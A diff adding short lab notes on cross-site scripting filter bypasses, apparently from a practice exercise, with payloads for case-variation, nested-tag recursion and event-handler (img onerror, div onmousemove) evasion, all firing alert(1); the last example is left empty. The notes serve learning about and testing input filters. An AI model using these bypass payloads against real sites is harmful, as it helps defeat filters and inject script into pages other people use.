@@ -6,3 +6,22 @@
 ### Example 1
 ``` There is no input validation, so, can exploit it directly with the classic “alert(1)” injection. ```
 ### Payload - <script>alert(1)</script>
+
+### Example 2
+``` Filtered <script> and </script> with preg_replace function ```
+### Payload - <sCript>alert(1)</sCript> and <scr<script>ipt>alert(1)</scr</script>ipt>
+  
+### Example 3
+``` Use PCRE modifier “i” (PCRE_CASELESS) to match both upper and lower case letters. However, recursion method still works fine. ```
+### Payload - <scr<script>ipt>alert(1)</scr</script>ipt>
+  
+  
+### Example 4 
+``` The script will stop when “script” is detected, Need other event without script ```
+### Payload - <img src="xxxx" onerror="alert(1)">  and <div onmousemove="alert(1)" src="xxxx"> , etc...
+  
+### Exmple 5
+``` ```
+### Payload - 
+
+
